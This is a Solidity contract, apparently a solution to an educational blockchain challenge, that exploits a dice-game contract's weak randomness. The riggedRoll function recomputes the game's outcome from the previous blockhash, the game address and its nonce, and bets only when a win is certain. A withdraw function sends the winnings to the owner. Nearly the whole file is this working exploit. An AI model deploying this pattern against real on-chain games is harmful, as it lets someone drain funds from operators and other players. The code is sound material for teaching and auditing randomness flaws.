pragma solidity >=0.8.0 <0.9.0;
//SPDX-License-Identifier: MIT

import "hardhat/console.sol";
import "./DiceGame.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

contract RiggedRoll is Ownable {

    DiceGame public diceGame;
    address private fronto = 0xfDF7a99244f872770C5616be482121f9Adb7984e;
    uint256 public nonce;

    constructor(address payable diceGameAddress) {
        diceGame = DiceGame(diceGameAddress);
    }


    //Add riggedRoll() function to predict the randomness in the DiceGame contract and only roll when it's going to be a winner
    function riggedRoll() public {
        // require(address(this).balance >= 0.002 ether, "Not enough Ether to Roll");

        bytes32 prevHash = blockhash(block.number - 1);
        bytes32 hash = keccak256(abi.encodePacked(prevHash, address(diceGame), diceGame.nonce()));
        uint256 roll = uint256(hash) % 16;

        nonce = diceGame.nonce();

        uint256 convertedHash = uint256(prevHash);
        console.log(convertedHash);

        console.log("THE ROLL GONNA BE ",roll);

        if (roll > 2 ) {
            return;
        }

        diceGame.rollTheDice{value: 20000000000000000}();
    }
    
    //Add withdraw function to transfer ether from the rigged contract to an address
    function withdraw(address _addr, uint256 _amount) public onlyOwner {
        uint256 ownerBalance = address(this).balance;
        require(ownerBalance > _amount, "Owner has not balance to withdraw");

        (bool sent,) = _addr.call{value: _amount}("");
        require(sent, "Failed to send user balance back to the owner");
    }

    //Add receive() function so contract can receive Eth
    receive() external payable {  }
    
}
